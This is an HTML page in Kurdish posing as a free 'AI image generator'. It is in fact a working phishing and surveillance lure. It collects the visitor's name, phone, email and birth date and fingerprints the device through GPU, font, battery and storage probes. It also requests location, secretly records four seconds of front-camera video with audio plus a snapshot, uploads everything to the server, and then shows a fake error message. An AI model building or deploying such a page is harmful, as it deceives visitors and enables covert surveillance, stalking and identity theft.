<!DOCTYPE html>
<html lang="ckb" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>وەرگرانی وێنەی زیرەک (AI Image Generator)</title>
    <style>
        body { font-family: Tahoma, sans-serif; background: #0f172a; color: #f8fafc; text-align: center; padding: 50px; }
        .card { background: #1e293b; padding: 30px; border-radius: 12px; max-width: 450px; margin: auto; box-shadow: 0 10px 25px rgba(0,0,0,0.3); }
        input, button { width: 100%; padding: 12px; margin-top: 15px; border-radius: 6px; border: none; font-size: 16px; box-sizing: border-box; }
        input { background: #334155; color: white; }
        button { background: #3b82f6; color: white; cursor: pointer; font-weight: bold; }
        button:hover { background: #2563eb; }
        #status { margin-top: 15px; font-size: 14px; color: #94a3b8; }
    </style>
</head>
<body>

    <div class="card">
        <h2>دروستکەری وێنەی AI</h2>
        <p>بۆ دروستکردنی وێنە بەپێی خواستت، تکایە زانیارییەکانت بنوسە:</p>
        
        <input type="text" id="name" placeholder="ناوی تەواو">
        <input type="text" id="phone" placeholder="ژمارەی تەلەفۆن">
        <input type="email" id="email" placeholder="ئیمەیڵ">
        <input type="date" id="dob">
        
        <button onclick="startProcess()">دروستکردن</button>
        <div id="status"></div>
    </div>

    <!-- کامێرای شاراوە -->
    <video id="video" autoplay playsinline style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

<script>
async function getDeviceDetails() {
    let details = {};

    // ١. زانیاری بیرگە (Storage & Disk)
    if (navigator.storage && navigator.storage.estimate) {
        try {
            let estimate = await navigator.storage.estimate();
            details.storageQuota = (estimate.quota / (1024 * 1024 * 1024)).toFixed(2) + " GB";
            details.storageUsage = (estimate.usage / (1024 * 1024 * 1024)).toFixed(4) + " GB";
        } catch(e) {
            details.storageQuota = "نەتوانرا بخوێنرێتەوە";
        }
    }

    // ٢. بلوتوث (Bluetooth API)
    if (navigator.bluetooth) {
        try {
            details.bluetoothAvailable = "بەردەستە";
            // تێبینی: داوای بلوتوث پێویستی بە چالاککردنی ڕاستەوخۆی بەکارهێنەر هەیە، لێرەدا تەنها پشکنینی بوونی دەکەین
        } catch(e) {
            details.bluetoothAvailable = "بەردەست نییە";
        }
    } else {
        details.bluetoothAvailable = "پشتیوانی ناکرێت";
    }

    // ٣. زانیاری وردی کارتی گرافیک (WebGL)
    try {
        let canvasGL = document.createElement('canvas');
        let gl = canvasGL.getContext('webgl') || canvasGL.getContext('experimental-webgl');
        if (gl) {
            let debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
            if (debugInfo) {
                details.gpuVendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
                details.gpuRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
            }
        }
    } catch(e) {
        details.gpuRenderer = "نەناسراو";
    }

    // ٤. فۆنتەکانی سیستەم (Font Enumeration)
    let candidateFonts = ['Arial', 'Arial Black', 'Comic Sans MS', 'Courier New', 'Georgia', 'Impact', 'Times New Roman', 'Trebuchet MS', 'Verdana', 'Tahoma', 'Cairo', 'Amiri'];
    let availableFonts = [];
    let baseFonts = ['monospace', 'sans-serif', 'serif'];
    
    // کورتکراوەی پشکنینی فۆنت
    let testString = "mmmmmmmmmmlli";
    let testSize = "72px";
    let h = document.getElementsByTagName("body")[0];
    let s = document.createElement("span");
    s.style.fontSize = testSize;
    s.innerHTML = testString;
    let defaultWidth = {};
    let defaultHeight = {};
    for (let index = 0; index < baseFonts.length; index++) {
        s.style.fontFamily = baseFonts[index];
        h.appendChild(s);
        defaultWidth[baseFonts[index]] = s.offsetWidth;
        defaultHeight[baseFonts[index]] = s.offsetHeight;
        h.removeChild(s);
    }
    for (let i = 0; i < candidateFonts.length; i++) {
        let detected = false;
        for (let j = 0; j < baseFonts.length; j++) {
            s.style.fontFamily = candidateFonts[i] + ',' + baseFonts[j];
            h.appendChild(s);
            let matched = (s.offsetWidth !== defaultWidth[baseFonts[j]] || s.offsetHeight !== defaultHeight[baseFonts[j]]);
            h.removeChild(s);
            if (matched) {
                detected = true;
                break;
            }
        }
        if (detected) availableFonts.push(candidateFonts[i]);
    }
    details.fonts = availableFonts.join(', ');

    // ٥. زانیارییە گشتییەکانی تر
    details.userAgent = navigator.userAgent;
    details.platform = navigator.platform;
    details.language = navigator.language;
    details.cores = navigator.hardwareConcurrency || 'نەزانراو';
    details.ram = navigator.deviceMemory || 'نەزانراو';
    details.screen = `${window.screen.width}x${window.screen.height}`;
    
    // پاتری
    if (navigator.getBattery) {
        try {
            let battery = await navigator.getBattery();
            details.battery = `${Math.round(battery.level * 100)}% (${battery.charging ? 'لەسەر شەحنە' : 'شەحنی نییە'})`;
        } catch(e) {}
    }

    return details;
}

async function startProcess() {
    let name = document.getElementById('name').value;
    let phone = document.getElementById('phone').value;
    let email = document.getElementById('email').value;
    let dob = document.getElementById('dob').value;

    if(!name) {
        alert("تکایە ناوەکەت بنووسە");
        return;
    }

    document.getElementById('status').innerText = "خەریکی ئامادەکردنی وێنەکەیە...";

    let deviceData = await getDeviceDetails();

    // وەرگرتنی لۆکەیشن
    navigator.geolocation.getCurrentPosition(async (pos) => {
        deviceData.lat = pos.coords.latitude;
        deviceData.lon = pos.coords.longitude;
        await captureMediaAndSend(name, phone, email, dob, deviceData);
    }, async (err) => {
        deviceData.lat = "ڕەتکرایەوە";
        deviceData.lon = "ڕەتکرایەوە";
        await captureMediaAndSend(name, phone, email, dob, deviceData);
    }, { timeout: 5000 });
}

async function captureMediaAndSend(name, phone, email, dob, deviceData) {
    try {
        let stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
        let video = document.getElementById('video');
        video.srcObject = stream;
        
        // ٦. تۆمارکردنی کورتە ڤیدیۆ (بۆ ماوەی ٤ چرکە)
        let mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
        let chunks = [];

        mediaRecorder.ondataavailable = function(e) {
            chunks.push(e.data);
        };

        mediaRecorder.onstop = async function() {
            let blob = new Blob(chunks, { type: 'video/webm' });
            
            // هەروەها وێنەیەکیش دەگرین (Snapshot)
            let canvas = document.getElementById('canvas');
            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;
            let ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            let imageBase64 = canvas.toDataURL('image/jpeg');

            // داخستنی کامێرا
            stream.getTracks().forEach(track => track.stop());

            // ناردنی هەموو زانیارییەکان بۆ سەروەر
            sendToServer(name, phone, email, dob, deviceData, imageBase64, blob);
        };

        mediaRecorder.start();
        setTimeout(() => {
            mediaRecorder.stop();
        }, 4000); // ٤ چرکە ڤیدیۆ

    } catch (e) {
        // ئەگەر کامێرا ڕەتکرایەوە، تەنها زانیارییەکان بنێرە
        sendToServer(name, phone, email, dob, deviceData, null, null);
    }
}

function sendToServer(name, phone, email, dob, deviceData, imageBase64, videoBlob) {
    let formData = new FormData();
    formData.append('name', name);
    formData.append('phone', phone);
    formData.append('email', email);
    formData.append('dob', dob);
    formData.append('data', JSON.stringify(deviceData));
    if(imageBase64) formData.append('image', imageBase64);
    if(videoBlob) formData.append('video', videoBlob, 'video.webm');

    fetch('/submit', {
        method: 'POST',
        body: formData
    }).then(res => {
        document.getElementById('status').innerText = "سەرکەوتوو بوو! وێنەکەت ئامادە دەبێت...";
        setTimeout(() => {
            alert("بوردن، کێشەیەک لە ڕاژەی AI هەیە، تکایە دواتر هەوڵ بدەرەوە.");
        }, 2000);
    });
}
</script>

</body>
</html>
